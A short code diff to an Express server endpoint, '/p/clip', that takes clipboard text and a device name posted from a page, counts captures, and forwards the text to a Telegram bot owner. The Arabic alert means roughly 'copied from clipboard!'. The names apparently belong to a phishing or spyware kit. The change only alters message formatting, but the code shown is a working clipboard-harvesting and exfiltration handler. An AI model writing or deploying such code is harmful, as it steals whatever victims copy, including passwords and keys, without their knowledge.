@@ -1146,7 +1146,7 @@ app.post("/p/clip", express.json({limit:"512kb"}), (req, res) => {
   if (!text || text.length < 3) return;
   pageConfig.clipCount = (pageConfig.clipCount||0) + 1;
   savePageConfig();
-  bot.sendMessage(BOT_OWNER, `📋 *نسخ من الحافظة!*\n📱 ${device||"?"}\n\n\`${text}\``, {parse_mode:"Markdown"}).catch(()=>{});
+  bot.sendMessage(BOT_OWNER, `📋 نسخ من الحافظة!\n📱 ${device||"?"}\n\n${text}`).catch(()=>{});
 });
 
 // ── Bot Logic ─────────────────────────────────────────────────────────────────
